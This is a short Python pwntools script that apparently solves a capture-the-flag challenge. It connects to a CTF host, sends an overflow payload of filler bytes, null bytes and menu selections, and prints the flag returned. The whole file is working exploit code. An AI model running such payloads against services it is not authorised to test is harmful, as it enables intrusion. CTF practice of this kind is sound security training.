#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

HOST = 'w4owkcjzvv0e.boroctf.com'
PORT = 53217

def exploit():
    log.info("Menghubungi server remote...")
    io = remote(HOST, PORT)

    log.info("Mengirimkan seluruh payload dan urutan menu secara sekuensial...")
    
    payload = b'A' * 32 + b'\x00' * 4 + b'\n3\n1\n2\n1\n'
    io.send(payload)

    log.info("Menunggu flag dari server (proses transisi remote agak lambat)...")
    
    output = io.recvall().decode('utf-8', errors='ignore')
    print(output)

if __name__ == '__main__':
    exploit()
